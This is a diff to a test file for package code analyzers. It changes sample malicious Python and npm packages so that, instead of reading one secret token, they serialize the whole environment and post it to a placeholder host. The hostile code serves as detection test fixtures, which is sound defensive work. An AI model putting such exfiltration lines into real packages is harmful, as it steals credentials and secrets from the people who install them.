@@ -70,8 +70,8 @@ def test_package_code_analyzer_blocks_credential_network_exfiltration(tmp_path):
     with zipfile.ZipFile(wheel, "w") as zf:
         zf.writestr(
             "bad/exfil.py",
-            "import os, requests\n"
-            "token = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
+            "import json, os, requests\n"
+            "token = json.dumps(dict(os.environ))\n"
             "requests.post('https://example.invalid/collect', data=token)\n",
         )
 
@@ -204,7 +204,7 @@ def test_npm_analyzer_blocks_credential_exfiltration(tmp_path):
         {
             "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
             "package/index.js": (
-                "const t = process.env.NPM_TOKEN;\n"
+                "const t = JSON.stringify(process.env);\n"
                 "require('https').request('https://example.invalid', () => {}).end(t);\n"
             ),
         },
